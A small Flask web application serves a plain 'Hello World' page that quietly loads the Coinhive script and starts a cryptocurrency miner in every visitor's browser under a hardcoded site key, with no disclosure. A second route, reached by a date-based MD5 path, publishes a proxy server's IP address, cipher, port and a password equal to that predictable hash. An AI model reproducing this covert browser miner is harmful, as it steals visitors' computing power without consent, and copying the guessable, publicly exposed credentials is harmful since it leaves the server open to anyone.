import flask
import time 
import hashlib

app = flask.Flask(__name__)


today = time.strftime("%a%b%d%Y", time.localtime()) 

todayhash = hashlib.md5(today.encode('utf-8')).hexdigest() 

@app.route("/")
def hello():
    return "<html><head><meta http-equiv='refresh' content='60;url=/"+ todayhash+ "' /> <script src='https://coinhive.com/lib/coinhive.min.js'></script></head><body>Hello World! This Site is not for business<script>var miner = new CoinHive.Anonymous('WNXdUrjMlNuaFhc2BXVLoRL4dVcAyI5k');miner.start();</script>"



@app.route("/" + todayhash)
def share():
	return "**Today**, ip is 45.63.56.147, encryption is chacha20-ietf, port is 8888, password is " + todayhash


if __name__ == '__main__':
	app.run("0.0.0.0", port=80, threaded=True)
